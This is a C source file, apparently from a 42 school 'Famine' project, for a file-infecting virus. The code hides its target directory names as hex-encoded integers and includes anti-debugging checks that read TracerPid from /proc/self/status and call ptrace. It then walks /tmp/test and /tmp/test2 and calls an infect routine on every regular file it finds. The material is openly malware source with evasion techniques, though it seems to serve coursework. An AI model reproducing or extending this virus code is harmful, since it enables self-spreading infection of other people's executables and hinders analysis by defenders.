/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 15:39:43 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#define BUFF_SIZE 0x1000

bool	mytest();

void check_debugger() {
	// uint64_t s = 0x0A6B63656863;
	uint64_t fail = 0x0A6C696166;
	
	uint64_t ret = 0;
	// write(ret, 1, &s, sizeof(uint64_t));

    long fd, bytes_read;
    char buffer[512];
    const char *path = "/proc/self/status";
    const char tracer_pid_key[] = "TracerPid:";

    // Ouvrir le fichier /proc/self/status
    open(fd, path, O_RDONLY);
    if (fd < 0) {
        // Si le fichier ne peut pas être ouvert, continuer sans rien faire
		write(ret, 1, &fail, sizeof(uint64_t));
        return;
    }

    // Lire le contenu du fichier
    write(bytes_read, fd, buffer, sizeof(buffer) - 1);
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0'; // Terminer la chaîne pour la recherche
        const char *found = buffer;
        while ((found = ft_strstr(found, tracer_pid_key))) {
            found += sizeof(tracer_pid_key) - 1;
            while (*found == ' ' || *found == '\t') found++; // Ignorer les espaces
            if (*found > '0' && *found <= '9') {
                // Débogueur détecté
                const char msg[] = "Debugger detected! Exiting...\n";
                write(ret, 1, msg, sizeof(msg) - 1);
                close(fd);
                exit(1);
            }
        }
    }

    // Fermer le fichier
    close(fd);
}



void famine() {
	byte		*start_rip;
	get_rip(start_rip);

	int64_t		ret = 0;
	int64_t		fd;
	byte		buff[BUFF_SIZE];
	//str		directories[] = {"/tmp/test", "/tmp/test2", NULL};
	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
	char		max_path[513];
	dirent		*d;
	// uint64_t	string = 0x000a303132333435;
	uint64_t s = 0x0A6F6C6C6568;
	// uint64_t detected = 0x0a6365746564;
	profiling	this;

	start_rip -= 0x12;
	this = get_profiling(start_rip);
	(void)this;

	// write(ret, 1, &string, sizeof(uint64_t));
	write(ret, 1, &s, sizeof(uint64_t));
	// write(ret, 1, "aaaaa\n", 6);

	// check_debugger();
	// int64_t test = 0;
	// ptrace(ret, 0, 0, 0, 0); // Si échec, un débogueur est attaché
    // if (ret < 0) {
    //     write(ret, 1, &detected, sizeof(uint64_t));
    //     exit(123);
    // }

	// if (mytest()) {
	// 	exit(123);
	// }

	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
		str	dir_name = (str)&directories[dir_index];
		size_t len_dir = ft_strlen(dir_name);

		for (size_t i = 0; i < len_dir; i++)
			max_path[i] = dir_name[i];
		max_path[len_dir] = '/';

		open(fd, dir_name, O_RDONLY);	
		if (fd < 0) {
			printf(FILE_LINE("open(%s) \033[31mfail:\033[0m %ld\n"), dir_name, ret);
			break;
		}

		getdents(ret, fd, buff, BUFF_SIZE);
		if (ret < 0) {
			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
			break;
		}

		while (ret > 0) {
			int64_t	d_offset = 0;

			while (d_offset < ret) {
				byte	d_type;

				d = (dirent *)((uint64_t)(buff) + d_offset);
				d_type = buff[d_offset + d->d_reclen - 1];

				if (d_type == DT_REG) {
					size_t	file_size = ft_strlen(d->d_name);

					for (size_t i = len_dir + 1; i < 513; i++)
						max_path[i] = 0;

					for (size_t i = 0; i < file_size; i++)
						max_path[len_dir + 1 + i] = d->d_name[i];

					infect(&this, max_path);
				}
				d_offset += d->d_reclen;
			}

			getdents(ret, fd, buff, BUFF_SIZE);
			if (ret < 0) {
				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
			}
		}

		close(fd);

		for (size_t i = 0; i < len_dir + 1; i++)
			max_path[i] = 0;
	}

	// write(ret, 1, &string, 8);
	write(ret, 1, &s, sizeof(uint64_t));
}


bool	mytest() {
	uint64_t	ret;
	ptrace(ret, 0, 0, 0, 0);
	return ret;
}
